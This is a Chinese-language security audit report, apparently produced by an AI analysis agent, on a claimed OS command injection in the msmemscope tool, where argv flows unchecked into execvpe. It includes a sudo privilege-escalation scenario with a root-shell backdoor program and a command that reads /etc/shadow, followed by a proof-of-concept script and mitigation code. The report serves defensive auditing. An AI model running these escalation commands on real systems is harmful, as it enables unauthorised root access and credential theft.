# VULN-DF-CROSS-002 深度利用分析报告

## 漏洞基本信息

| 字段 | 值 |
|------|------|
| 漏洞 ID | VULN-DF-CROSS-002 |
| 类型 | cross_module_data_flow (跨模块数据流) |
| CWE | CWE-78: OS Command Injection |
| 严重性 | High |
| 置信度 | 85 |
| 跨模块 | main → framework |
| 描述 | 跨模块命令行到进程执行链 |

## 跨模块数据流分析

### 模块结构

```
┌─────────────────────────────────────────────────────────────┐
│                        main 模块                             │
│  csrc/main.cpp                                               │
│  ┌────────────────────────────────────────────────────────┐ │
│  │  main(argc, argv)                                      │ │
│  │    ↓                                                   │ │
│  │  parser.Interpretor(argc, argv) ←── 模块边界           │ │
│  └────────────────────────────────────────────────────────┘ │
└──────────────────────────┬──────────────────────────────────┘
                           │ 数据传递: argc, argv
                           ↓
┌─────────────────────────────────────────────────────────────┐
│                     framework 模块                           │
│  csrc/framework/                                             │
│  ┌────────────────────────────────────────────────────────┐ │
│  │  ClientParser::Interpretor(argc, argv)                 │ │
│  │    ↓                                                   │ │
│  │  ClientParser::Parse(argc, argv)                       │ │
│  │    ↓                                                   │ │
│  │  userCommand.cmd                                       │ │
│  │    ↓                                                   │ │
│  │  DoUserCommand()                                       │ │
│  │    ↓                                                   │ │
│  │  Command::Exec()                                       │ │
│  │    ↓                                                   │ │
│  │  Process::Launch(cmd)                                  │ │
│  │    ↓                                                   │ │
│  │  ExecCmd::ExecCmd(args)                                │ │
│  │    ↓                                                   │ │
│  │  execvpe(path, argv, environ) ←── SINK                │ │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### 模块边界数据传递

| 边界位置 | 传递数据 | 数据来源 | 安全检查 |
|----------|----------|----------|----------|
| main → framework | argc, argv | 用户命令行 | ❌ 无验证 |
| ClientParser → Command | userCommand.cmd | 解析结果 | ❌ 无验证 |
| Command → Process | ExecCmd | 用户参数 | ❌ 仅 realpath |
| Process → execvpe | path, argv | 用户控制 | ❌ 无验证 |

### 跨模块调用链

```cpp
// main 模块 - 入口点
// csrc/main.cpp:22
int32_t main(int32_t argc, char **argv)
{
    MemScope::ClientParser parser;              // framework 模块类
    parser.Interpretor(argc, argv);             // 跨模块调用
    return 0;
}

// framework 模块 - 命令解析
// csrc/framework/client_parser.cpp:211
void ClientParser::Interpretor(int32_t argc, char **argv)
{
    auto userCommand = Parse(argc, argv);       // 解析参数
    DoUserCommand(userCommand);                 // 执行命令
}

// framework 模块 - 命令执行
// csrc/framework/client_parser.cpp:188
void DoUserCommand(const UserCommand& userCommand)
{
    Command command {userCommand};
    command.Exec();
}

// framework 模块 - 进程启动
// csrc/framework/command.cpp:41
void Command::Exec() const
{
    Process::GetInstance(userCommand_.config).Launch(userCommand_.cmd);
}

// framework 模块 - 进程执行
// csrc/framework/process.cpp:224-228
void Process::DoLaunch(const ExecCmd &cmd)
{
    execvpe(cmd.ExecPath().c_str(), cmd.ExecArgv(), environ);
    _exit(EXIT_FAILURE);
}
```

## 模块边界安全分析

### 1. 数据流完整性

**关键发现**: 用户数据从 main 模块入口到达 framework 模块的进程执行 sink，全程**无安全验证**。

| 检查点 | 是否验证 | 风险 |
|--------|----------|------|
| argc/argv 边界传递 | ❌ | 用户完全控制参数数量和内容 |
| 命令参数解析 | ❌ | Parse() 只提取参数，不验证安全性 |
| 目标程序路径 | 部分 | realpath() 解析路径，但不验证权限 |
| 目标程序参数 | ❌ | 用户完全控制所有参数 |

### 2. 模块边界验证缺失

**边界 1: main → ClientParser**

```cpp
// main.cpp
parser.Interpretor(argc, argv);  // 直接传递，无验证
```

**缺失的安全检查**:
- 参数数量限制
- 参数长度限制
- 参数内容过滤（特殊字符、路径遍历）

**边界 2: ClientParser → Command**

```cpp
// client_parser.cpp
Command command {userCommand};  // 直接传递解析结果
command.Exec();
```

**缺失的安全检查**:
- 目标程序路径白名单验证
- 参数安全性检查

### 3. 跨模块数据流风险点

| 风险点 | 模块 | 位置 | 描述 |
|--------|------|------|------|
| 入口无过滤 | main | main.cpp:22 | argv 直接传递，无预处理 |
| 解析无验证 | framework | client_parser.cpp:859 | Parse() 只解析，不验证安全性 |
| 路径解析不足 | framework | process.cpp:49 | realpath() 只解析，不验证权限 |
| 直接执行 | framework | process.cpp:227 | execvpe() 无前置安全检查 |

## 漏洞利用分析

### 1. 前置条件

与 VULN-DF-PROC-001 相同，需要工具以更高权限运行。

### 2. 跨模块攻击路径

```
攻击者控制 argv
        ↓
    [main 模块]
        ↓ 无验证
    [framework 模块]
        ↓ 无验证
    ClientParser::Parse
        ↓ 无验证
    userCommand.cmd
        ↓ 无验证
    Process::Launch
        ↓ 无验证
    execvpe(用户控制的程序)
```

**攻击关键**: 跨模块边界没有安全验证，用户数据完整传递到进程执行 sink。

### 3. 攻击场景

**场景: 利用 sudo 配置的 msmemscope**

```bash
# sudoers 配置
developer ALL=(root) NOPASSWD: /opt/msmemscope/bin/msmemscope

# 攻击步骤
# 1. 在用户可控目录创建恶意程序
mkdir -p ~/exploit_dir
cat > ~/exploit_dir/backdoor.c << 'EOF'
#include <unistd.h>
int main() {
    if (geteuid() == 0) {
        setuid(0);
        execl("/bin/bash", "bash", NULL);
    }
    return 1;
}
EOF
gcc ~/exploit_dir/backdoor.c -o ~/exploit_dir/backdoor

# 2. 通过 msmemscope 执行
sudo msmemscope ~/exploit_dir/backdoor

# 3. 获得 root shell
```

### 4. 模块边界注入攻击

**利用参数注入**:

```bash
# 如果用户可以控制参数传递
sudo msmemscope /bin/bash -c "id;cat /etc/shadow"

# 数据流:
# argv[0] = "msmemscope"
# argv[1] = "/bin/bash"      ← 用户控制
# argv[2] = "-c"             ← 用户控制
# argv[3] = "id;cat /etc/shadow" ← 用户控制
# ↓
# framework 模块接收完整参数数组
# ↓
# execvpe("/bin/bash", {"bash", "-c", "id;cat /etc/shadow"}, environ)
```

## 影响范围评估

### 跨模块安全影响

| 影响维度 | 说明 |
|----------|------|
| 模块隔离失效 | 数据在模块间传递无验证，破坏模块安全边界 |
| 信任边界跨越 | 用户数据从 untrusted 入口到达 trusted 执行点 |
| 难以追踪 | 跨模块数据流增加安全审计复杂度 |

### 攻击面扩展

跨模块特性增加了以下攻击面：
1. **模块边界攻击**: 可在模块传递点注入数据
2. **间接攻击**: 可通过修改 framework 模块的配置影响 main 模块行为
3. **模块依赖攻击**: 如果 framework 模块有其他漏洞，可组合利用

## PoC 可行性分析

### PoC 设计（跨模块视角）

```bash
#!/bin/bash
# cross_module_poc.sh - 验证跨模块数据流

# 1. 准备测试程序
cat > /tmp/cross_module_test.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(int argc, char **argv) {
    FILE *f = fopen("/tmp/cross_module_result.txt", "w");
    fprintf(f, "Module: framework\n");
    fprintf(f, "UID: %d, EUID: %d\n", getuid(), geteuid());
    fprintf(f, "Args: %d\n", argc);
    for (int i = 0; i < argc; i++) {
        fprintf(f, "  argv[%d] = %s\n", i, argv[i]);
    }
    fclose(f);
    return 0;
}
EOF
gcc /tmp/cross_module_test.c -o /tmp/cross_module_test

# 2. 通过 msmemscope 执行（如果配置了 sudo）
sudo msmemscope /tmp/cross_module_test arg1 arg2 "injected;command"

# 3. 检查结果
cat /tmp/cross_module_result.txt
# 预期输出显示:
# - 数据从 main 模块传递到 framework 模块
# - framework 模块执行了用户指定的程序和参数
# - 如果 sudo 运行，EUID 应为 0
```

### 验证跨模块数据流完整性

```bash
# 使用 strace 跟踪跨模块调用
strace -f -e trace=execve sudo msmemscope /tmp/test_program

# 输出应显示:
# [main 模块] execve("msmemscope", ...)
# [framework 模块] execve("/tmp/test_program", ...)
```

## 缓解措施建议

### 1. 模块边界验证（推荐）

**在 main 模块添加输入验证**

```cpp
// csrc/main.cpp - 添加安全验证
#include <string>
#include <vector>

bool ValidateCommandLine(int32_t argc, char **argv) {
    // 1. 参数数量限制
    if (argc > 64) {
        std::cerr << "Too many arguments\n";
        return false;
    }
    
    // 2. 参数长度限制
    for (int i = 0; i < argc; i++) {
        if (strlen(argv[i]) > 4096) {
            std::cerr << "Argument too long\n";
            return false;
        }
    }
    
    return true;
}

int32_t main(int32_t argc, char **argv)
{
    if (!ValidateCommandLine(argc, argv)) {
        return 1;
    }
    
    MemScope::ClientParser parser;
    parser.Interpretor(argc, argv);
    return 0;
}
```

### 2. framework 模块接收验证

**在 ClientParser::Interpretor 添加验证**

```cpp
// csrc/framework/client_parser.cpp
void ClientParser::Interpretor(int32_t argc, char **argv)
{
    // 验证来自 main 模块的数据
    if (argc <= 0 || argv == nullptr) {
        LOG_ERROR("Invalid command line parameters");
        return;
    }
    
    auto userCommand = Parse(argc, argv);
    
    // 验证解析结果
    if (!ValidateUserCommand(userCommand)) {
        LOG_ERROR("User command validation failed");
        return;
    }
    
    DoUserCommand(userCommand);
}

bool ValidateUserCommand(const UserCommand& cmd) {
    // 1. 目标程序路径验证
    if (!cmd.cmd.ExecPath().empty()) {
        struct stat st;
        if (stat(cmd.cmd.ExecPath().c_str(), &st) != 0) {
            LOG_ERROR("Target program does not exist");
            return false;
        }
        
        // 检查权限安全性
        if (st.st_uid != getuid() && st.st_uid != 0) {
            LOG_WARN("Target program owned by other user");
        }
        
        if (st.st_mode & (S_ISUID | S_ISGID)) {
            LOG_ERROR("Target program has setuid/setgid bits - not allowed");
            return false;
        }
    }
    
    return true;
}
```

### 3. 跨模块数据传递安全协议

**定义模块间数据传递规范**

```cpp
// 定义安全的数据传递接口
namespace MemScope {

// 模块间传递的安全数据结构
struct SafeCommandLine {
    int32_t argc;
    std::vector<std::string> validated_args;
    
    static SafeCommandLine FromRaw(int32_t argc, char **argv) {
        SafeCommandLine safe;
        safe.argc = argc;
        
        for (int i = 0; i < argc; i++) {
            std::string arg(argv[i]);
            
            // 安全验证
            if (arg.length() > 4096) {
                throw std::runtime_error("Argument too long");
            }
            
            // 过滤危险字符
            if (arg.find("..") != std::string::npos && 
                arg.find("/") != std::string::npos) {
                LOG_WARN("Potential path traversal in argument");
            }
            
            safe.validated_args.push_back(arg);
        }
        
        return safe;
    }
};

}  // namespace MemScope
```

### 4. 模块职责分离

**明确各模块的安全职责**

| 模块 | 安全职责 |
|------|----------|
| main | 输入验证、参数过滤、长度限制 |
| framework | 目标程序验证、权限检查、执行控制 |

### 5. 审计日志

**跨模块数据流审计**

```cpp
// 在模块边界添加审计日志
void ClientParser::Interpretor(int32_t argc, char **argv)
{
    LOG_AUDIT("Cross-module call: main → framework");
    LOG_AUDIT("Received argc=%d", argc);
    
    for (int i = 0; i < argc && i < 10; i++) {  // 只记录前10个参数
        LOG_AUDIT("argv[%d]=%s", i, argv[i]);
    }
    
    // ... 原有逻辑
}
```

## 与 VULN-DF-PROC-001 的关系

### 漏洞关联分析

| 维度 | VULN-DF-PROC-001 | VULN-DF-CROSS-002 |
|------|------------------|-------------------|
| 本质 | 进程执行漏洞 | 跨模块数据流漏洞 |
| 位置 | framework 模块内部 | main → framework 边界 |
| 关注点 | execvpe 调用点 | 模块间数据传递 |
| 根因 | 缺少执行前验证 | 缺少边界验证 |

**结论**: 这两个漏洞本质上是同一个安全问题在不同视角下的表现：
- VULN-DF-PROC-001 关注最终执行点
- VULN-DF-CROSS-002 关注数据传递过程

建议同时修复两个层面的问题。

## 风险评级总结

### 最终风险评估

| 维度 | 评分 | 说明 |
|------|------|------|
| 可达性 | 30/30 | 跨模块数据流完整 |
| 可控性 | 25/30 | 用户完全控制传递数据 |
| 缓解措施 | -5 | realpath 有基本路径解析 |
| **总置信度** | **85** | 真实安全风险 |

### 结论

**这是一个跨模块数据流安全问题。**

用户数据从 main 模块无验证传递到 framework 模块的进程执行点，模块边界缺少安全验证机制。

**建议**:
1. 在 main 模块入口添加参数验证
2. 在 framework 模块接收点添加目标程序安全检查
3. 建立模块间数据传递安全协议

---

**报告生成时间**: 2026-04-20
**分析师**: Details Analyzer Agent